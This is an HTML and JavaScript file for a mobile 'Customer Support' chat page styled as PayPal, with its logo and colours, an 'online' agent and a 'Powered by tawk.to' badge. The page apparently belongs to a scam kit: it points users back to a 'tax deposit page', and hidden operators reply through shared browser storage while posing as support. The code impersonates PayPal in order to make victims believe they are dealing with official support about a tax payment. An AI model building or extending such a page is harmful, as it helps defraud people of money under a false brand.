<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Customer Support – PayPal</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: "PayPal Sans", -apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial, sans-serif;
      background: #f5f7fa;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    /* ── Top Nav (matches tax.html) ── */
    .pp-topbar {
      background: #003087;
      height: 56px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 1.25rem;
      flex-shrink: 0;
    }

    .pp-topbar button {
      background: none;
      border: none;
      cursor: pointer;
      color: rgba(255,255,255,0.85);
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 4px;
      width: 36px;
      height: 36px;
    }

    .hamburger {
      display: flex;
      flex-direction: column;
      gap: 5px;
      padding: 2px;
    }

    .hamburger span {
      display: block;
      width: 20px;
      height: 1.5px;
      background: rgba(255,255,255,0.9);
      border-radius: 1px;
    }

    .pp-topbar-logo { display: flex; align-items: center; }
    .pp-topbar-logo svg { display: block; }

    /* ── Main layout ── */
    .pp-main {
      flex: 1;
      display: flex;
      flex-direction: column;
      max-width: 480px;
      width: 100%;
      margin: 0 auto;
      padding: 1.5rem 1.25rem 2rem;
    }

    /* ── Page title bar ── */
    .pp-page-title {
      display: flex;
      align-items: center;
      gap: 0.65rem;
      margin-bottom: 1.25rem;
    }

    .pp-back-btn {
      background: none;
      border: none;
      cursor: pointer;
      color: #003087;
      font-size: 1.3rem;
      line-height: 1;
      padding: 2px 6px;
      border-radius: 4px;
      transition: background 0.14s;
      display: flex;
      align-items: center;
    }

    .pp-back-btn:hover { background: #e8f0fb; }

    .pp-page-title h1 {
      font-size: 1rem;
      font-weight: 600;
      color: #2c2e2f;
    }

    /* ── Chat card ── */
    .chat-card {
      flex: 1;
      display: flex;
      flex-direction: column;
      background: #fff;
      border: 1px solid #d9dde3;
      border-radius: 8px;
      box-shadow: 0 1px 4px rgba(0,0,0,0.07);
      overflow: hidden;
      min-height: 500px;
    }

    /* Chat header inside card */
    .chat-card-header {
      background: #003087;
      padding: 0.9rem 1.1rem;
      display: flex;
      align-items: center;
      gap: 0.65rem;
      flex-shrink: 0;
    }

    .chat-agent-avatar {
      width: 36px;
      height: 36px;
      border-radius: 50%;
      background: rgba(255,255,255,0.15);
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
    }

    .chat-agent-avatar svg { display: block; }

    .chat-agent-info { flex: 1; }

    .chat-agent-name {
      font-size: 0.9rem;
      font-weight: 600;
      color: #fff;
    }

    .chat-agent-status {
      font-size: 0.72rem;
      color: rgba(255,255,255,0.65);
      display: flex;
      align-items: center;
      gap: 4px;
      margin-top: 2px;
    }

    .online-dot {
      width: 6px;
      height: 6px;
      border-radius: 50%;
      background: #42d579;
      display: inline-block;
    }

    .chat-ticket-badge {
      font-size: 0.7rem;
      color: rgba(255,255,255,0.6);
      background: rgba(255,255,255,0.12);
      padding: 2px 8px;
      border-radius: 999px;
    }

    /* Messages area */
    .chat-messages {
      flex: 1;
      overflow-y: auto;
      padding: 1.25rem 1rem;
      display: flex;
      flex-direction: column;
      gap: 0.85rem;
      background: #f8f9fb;
    }

    /* Empty state */
    .chat-empty {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 2rem;
      text-align: center;
      color: #9da3aa;
    }

    .chat-empty svg { margin-bottom: 0.85rem; opacity: 0.4; }

    .chat-empty p {
      font-size: 0.875rem;
      line-height: 1.6;
    }

    .chat-empty strong { color: #6c7378; font-weight: 600; }

    /* Date separator */
    .date-sep {
      text-align: center;
      font-size: 0.7rem;
      color: #9da3aa;
      position: relative;
      padding: 0 1rem;
      flex-shrink: 0;
    }

    .date-sep::before, .date-sep::after {
      content: '';
      position: absolute;
      top: 50%;
      width: calc(50% - 2.5rem);
      height: 1px;
      background: #e5e9f0;
    }

    .date-sep::before { left: 0; }
    .date-sep::after  { right: 0; }

    /* Message rows */
    .msg-row {
      display: flex;
      align-items: flex-end;
      gap: 0.5rem;
    }

    .msg-row.user { flex-direction: row-reverse; }

    .msg-avatar {
      width: 30px;
      height: 30px;
      border-radius: 50%;
      background: #003087;
      flex-shrink: 0;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .msg-avatar svg { display: block; }

    .msg-col {
      max-width: 75%;
      display: flex;
      flex-direction: column;
      gap: 3px;
    }

    .msg-name {
      font-size: 0.69rem;
      color: #9da3aa;
      font-weight: 500;
    }

    .msg-bubble {
      padding: 0.6rem 0.85rem;
      border-radius: 16px;
      font-size: 0.875rem;
      line-height: 1.5;
      word-break: break-word;
    }

    .msg-bubble.support {
      background: #1db954;
      color: #fff;
      border-bottom-left-radius: 3px;
    }

    .msg-bubble.user-msg {
      background: #fff;
      color: #2c2e2f;
      border: 1px solid #d9dde3;
      border-bottom-right-radius: 3px;
    }

    .msg-time {
      font-size: 0.67rem;
      color: #c0c5cc;
    }

    .msg-row.user .msg-time { text-align: right; }

    /* Typing indicator */
    .typing-row {
      display: flex;
      align-items: flex-end;
      gap: 0.5rem;
    }

    .typing-dots {
      background: #1db954;
      border-radius: 16px;
      border-bottom-left-radius: 3px;
      padding: 0.55rem 0.8rem;
      display: flex;
      gap: 4px;
      align-items: center;
    }

    .typing-dots span {
      width: 5px;
      height: 5px;
      background: rgba(255,255,255,0.8);
      border-radius: 50%;
      animation: tdot 1.1s infinite;
    }

    .typing-dots span:nth-child(2) { animation-delay: 0.18s; }
    .typing-dots span:nth-child(3) { animation-delay: 0.36s; }

    @keyframes tdot {
      0%, 60%, 100% { transform: translateY(0); opacity: 0.6; }
      30%            { transform: translateY(-5px); opacity: 1; }
    }

    /* Status bar */
    .chat-status-bar {
      padding: 0.45rem 1rem;
      background: #f0f4f8;
      border-top: 1px solid #e5e9f0;
      border-bottom: 1px solid #e5e9f0;
      display: flex;
      align-items: center;
      justify-content: space-between;
      flex-shrink: 0;
    }

    .chat-ticket-id {
      font-size: 0.72rem;
      color: #9da3aa;
      font-family: "SF Mono", "Courier New", monospace;
    }

    .ticket-status-pill {
      font-size: 0.7rem;
      font-weight: 600;
      padding: 2px 8px;
      border-radius: 999px;
      text-transform: uppercase;
      letter-spacing: 0.04em;
    }

    .pill-open     { background: #d4edda; color: #155724; }
    .pill-answered { background: #fff3cd; color: #856404; }
    .pill-closed   { background: #f8d7da; color: #721c24; }

    /* Input area */
    .chat-input-area {
      border-top: 1px solid #e5e9f0;
      background: #fff;
      padding: 0.75rem 1rem;
      display: flex;
      align-items: center;
      gap: 0.6rem;
      flex-shrink: 0;
    }

    .chat-input-wrap {
      flex: 1;
      display: flex;
      align-items: center;
      background: #f5f7fa;
      border: 1.5px solid #d9dde3;
      border-radius: 999px;
      padding: 0.45rem 1rem;
      transition: border-color 0.15s;
    }

    .chat-input-wrap:focus-within {
      border-color: #003087;
      background: #fff;
    }

    .chat-input {
      flex: 1;
      border: none;
      outline: none;
      font-size: 0.875rem;
      color: #2c2e2f;
      background: transparent;
      font-family: inherit;
    }

    .chat-input::placeholder { color: #adb4bc; }

    .send-btn {
      width: 36px;
      height: 36px;
      border-radius: 50%;
      background: #003087;
      border: none;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: background 0.15s, transform 0.15s;
      flex-shrink: 0;
    }

    .send-btn:hover  { background: #002168; transform: scale(1.05); }
    .send-btn:active { transform: scale(0.97); }
    .send-btn svg    { display: block; }

    /* Powered by */
    .chat-powered {
      text-align: center;
      font-size: 0.69rem;
      color: #c0c5cc;
      padding: 0.3rem 0 0.4rem;
      background: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 4px;
      flex-shrink: 0;
    }

    .tawkto-pill {
      background: #03a84e;
      color: #fff;
      font-weight: 700;
      font-size: 0.6rem;
      border-radius: 3px;
      padding: 1px 4px;
    }

    /* No-ticket prompt */
    .no-ticket-card {
      background: #fff;
      border: 1px solid #d9dde3;
      border-radius: 8px;
      padding: 2rem 1.5rem;
      text-align: center;
      box-shadow: 0 1px 4px rgba(0,0,0,0.06);
    }

    .no-ticket-card h2 {
      font-size: 1rem;
      font-weight: 600;
      color: #2c2e2f;
      margin-bottom: 0.5rem;
    }

    .no-ticket-card p {
      font-size: 0.84rem;
      color: #6c7378;
      line-height: 1.6;
      margin-bottom: 1.25rem;
    }

    .pp-btn {
      display: inline-block;
      padding: 0.7rem 1.5rem;
      background: #0070ba;
      color: #fff;
      font-family: inherit;
      font-size: 0.9rem;
      font-weight: 600;
      border: none;
      border-radius: 24px;
      cursor: pointer;
      text-decoration: none;
      transition: background 0.15s;
    }

    .pp-btn:hover { background: #005ea6; }
  </style>
</head>
<body>

  <!-- Top Nav -->
  <nav class="pp-topbar">
    <button class="hamburger" aria-label="Menu">
      <span></span><span></span><span></span>
    </button>
    <div class="pp-topbar-logo">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="30" viewBox="0 0 32 38" fill="none">
        <path d="M27.6 5.3C26 3.5 23 2.6 19.1 2.6H7.4C6.5 2.6 5.8 3.2 5.6 4.1L1 31.1C.9 31.7 1.3 32.3 1.9 32.3H8.7L10.4 21.6l-.1.5C10.5 21.2 11.2 20.6 12.1 20.6h3.3c6.7 0 11.9-2.9 13.5-10.8.1-.3.1-.6.1-.8.1-1.5-.4-2.7-1.4-3.7z" fill="rgba(255,255,255,0.75)"/>
        <path d="M12.3 9.1c.1-.5.4-.9.8-1.2.2-.1.5-.2.8-.2h9c1.1 0 2 .1 2.9.3l.8.2.7.3.4.3.3.5C27.4 5.9 25 4.3 20.4 4.3H9.4c-.9 0-1.6.6-1.8 1.5L3 32.9c-.1.6.3 1.2.9 1.2h6.2l2.2-25z" fill="rgba(255,255,255,0.95)"/>
        <path d="M28.9 9c0 .2 0 .5-.1.7-1.6 7.9-6.8 10.8-13.5 10.8H12c-.9 0-1.6.6-1.7 1.5L8.1 35.4c-.1.6.3 1.1.9 1.1h5.9c.8 0 1.4-.6 1.5-1.4l.1-.4 1.1-6.8.1-.5c.1-.8.7-1.4 1.5-1.4h.9c5.9 0 10.4-2.6 11.8-9.5.6-2.8.3-5.2-1.2-6.9l-1.8-.6z" fill="rgba(255,255,255,0.5)"/>
      </svg>
    </div>
    <button aria-label="Notifications">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round">
        <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/>
        <path d="M13.73 21a2 2 0 0 1-3.46 0"/>
      </svg>
    </button>
  </nav>

  <!-- Main -->
  <main class="pp-main" id="mainContent">
    <!-- Rendered by JS -->
  </main>

  <script src="app.js"></script>
  <script>
    const CHAT_TICKET_KEY = 'pp_chat_ticket_id';

    // ─────────────────────────────────────
    //  On load — find the right ticket
    // ─────────────────────────────────────
    document.addEventListener('DOMContentLoaded', function () {
      const savedTicketId = localStorage.getItem(CHAT_TICKET_KEY);
      const tickets = getSupportTickets();

      let ticket = null;

      if (savedTicketId) {
        ticket = tickets.find(t => t.id === savedTicketId) || null;
      }

      // Fall back to most recent ticket if no pinned one
      if (!ticket && tickets.length > 0) {
        ticket = tickets[0];
      }

      if (ticket) {
        renderChatView(ticket);
      } else {
        renderNoTicket();
      }
    });

    // ─────────────────────────────────────
    //  Render: active chat conversation
    // ─────────────────────────────────────
    function renderChatView(ticket) {
      const main = document.getElementById('mainContent');

      const statusClass =
        ticket.status.toLowerCase() === 'open'     ? 'pill-open'     :
        ticket.status.toLowerCase() === 'answered' ? 'pill-answered'  : 'pill-closed';

      main.innerHTML = `
        <div class="pp-page-title">
          <button class="pp-back-btn" onclick="window.location.href='tax.html'" aria-label="Back">&#8249;</button>
          <h1>Customer Support</h1>
        </div>

        <div class="chat-card">

          <!-- Chat header -->
          <div class="chat-card-header">
            <div class="chat-agent-avatar">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
                <circle cx="12" cy="8" r="4" fill="rgba(255,255,255,0.9)"/>
                <path d="M4 20c0-4 3.6-7 8-7s8 3 8 7" stroke="rgba(255,255,255,0.9)" stroke-width="1.5" stroke-linecap="round"/>
              </svg>
            </div>
            <div class="chat-agent-info">
              <div class="chat-agent-name">Customer Support</div>
              <div class="chat-agent-status">
                <span class="online-dot"></span>
                <span>Online &nbsp;·&nbsp; Typically replies instantly</span>
              </div>
            </div>
            <span class="chat-ticket-badge">${escapeHtml(ticket.id)}</span>
          </div>

          <!-- Status bar -->
          <div class="chat-status-bar">
            <span class="chat-ticket-id">Order: ${escapeHtml(ticket.orderId)}</span>
            <span class="ticket-status-pill ${statusClass}" id="ticketStatusPill">${escapeHtml(ticket.status)}</span>
          </div>

          <!-- Messages -->
          <div class="chat-messages" id="chatMessages">
            <div class="date-sep">Today</div>
          </div>

          <!-- Input -->
          <div class="chat-input-area">
            <div class="chat-input-wrap">
              <input class="chat-input" id="chatInput" type="text" placeholder="Type here and press enter.." autocomplete="off"/>
            </div>
            <button class="send-btn" onclick="sendMessage()" aria-label="Send">
              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                <line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/>
              </svg>
            </button>
          </div>

          <div class="chat-powered">
            <span class="tawkto-pill">t</span>
            Powered by tawk.to
          </div>

        </div>
      `;

      // Render all existing messages
      renderMessages(ticket);

      // Bind send
      document.getElementById('chatInput').addEventListener('keydown', function(e) {
        if (e.key === 'Enter') sendMessage();
      });

      // Listen for admin replies from other tabs
      window.addEventListener('storage', function(e) {
        if (e.key !== TICKETS_STORAGE_KEY) return;
        const updated = getSupportTickets().find(t => t.id === ticket.id);
        if (!updated) return;
        ticket = updated;
        renderMessages(ticket);
        // Update status pill
        const pill = document.getElementById('ticketStatusPill');
        if (pill) {
          const sc = updated.status.toLowerCase() === 'open' ? 'pill-open' :
                     updated.status.toLowerCase() === 'answered' ? 'pill-answered' : 'pill-closed';
          pill.className = `ticket-status-pill ${sc}`;
          pill.textContent = updated.status;
        }
      });
    }

    // ─────────────────────────────────────
    //  Render all messages into chat
    // ─────────────────────────────────────
    function renderMessages(ticket) {
      const container = document.getElementById('chatMessages');
      if (!container) return;

      // Clear everything except the date separator
      Array.from(container.children).forEach(el => {
        if (!el.classList.contains('date-sep')) el.remove();
      });

      ticket.messages.forEach(msg => {
        if (msg.sender === 'customer') {
          container.appendChild(buildUserBubble(msg.text, msg.timestamp));
        } else {
          container.appendChild(buildSupportBubble(msg.text, msg.timestamp));
        }
      });

      container.scrollTop = container.scrollHeight;
    }

    // ─────────────────────────────────────
    //  Send message
    // ─────────────────────────────────────
    function sendMessage() {
      const input = document.getElementById('chatInput');
      if (!input) return;
      const text = input.value.trim();
      if (!text) return;
      input.value = '';

      const savedTicketId = localStorage.getItem(CHAT_TICKET_KEY);
      if (!savedTicketId) return;

      const tickets = getSupportTickets();
      const ticket = tickets.find(t => t.id === savedTicketId);
      if (!ticket) return;

      const ts = getCurrentTimestamp();
      ticket.messages.push({
        sender: 'customer',
        senderName: ticket.customerName || 'Customer',
        text: text,
        timestamp: ts
      });
      ticket.status = 'Open';
      saveSupportTickets(tickets);

      // Add to UI immediately
      const container = document.getElementById('chatMessages');
      container.appendChild(buildUserBubble(text, ts));
      container.scrollTop = container.scrollHeight;
    }

    // ─────────────────────────────────────
    //  No ticket state
    // ─────────────────────────────────────
    function renderNoTicket() {
      const main = document.getElementById('mainContent');
      main.innerHTML = `
        <div class="pp-page-title">
          <button class="pp-back-btn" onclick="window.location.href='tax.html'" aria-label="Back">&#8249;</button>
          <h1>Customer Support</h1>
        </div>
        <div class="no-ticket-card">
          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#c0c5cc" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="margin:0 auto 1rem;">
            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
          </svg>
          <h2>No active conversation</h2>
          <p>Go back to the tax deposit page and click <strong>Contact Support</strong> to start a conversation with our team.</p>
          <a href="tax.html" class="pp-btn">Go to Tax Deposit Page</a>
        </div>
      `;
    }

    // ─────────────────────────────────────
    //  DOM builders
    // ─────────────────────────────────────
    function buildUserBubble(text, time) {
      const wrapper = document.createElement('div');
      wrapper.className = 'msg-row user';
      wrapper.innerHTML = `
        <div class="msg-col" style="align-items:flex-end;">
          <div class="msg-bubble user-msg">${escapeHtml(text)}</div>
          <span class="msg-time">${time || ''}</span>
        </div>
      `;
      return wrapper;
    }

    function buildSupportBubble(text, time) {
      const wrapper = document.createElement('div');
      wrapper.className = 'msg-row';
      wrapper.innerHTML = `
        <div class="msg-avatar">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
            <circle cx="12" cy="8" r="4" fill="rgba(255,255,255,0.9)"/>
            <path d="M4 20c0-4 3.6-7 8-7s8 3 8 7" stroke="rgba(255,255,255,0.9)" stroke-width="1.5" stroke-linecap="round"/>
          </svg>
        </div>
        <div class="msg-col">
          <span class="msg-name">Customer Support</span>
          <div class="msg-bubble support">${escapeHtml(text)}</div>
          <span class="msg-time">${time || ''}</span>
        </div>
      `;
      return wrapper;
    }

    function escapeHtml(text) {
      const d = document.createElement('div');
      d.textContent = text;
      return d.innerHTML;
    }
  </script>
</body>
</html>
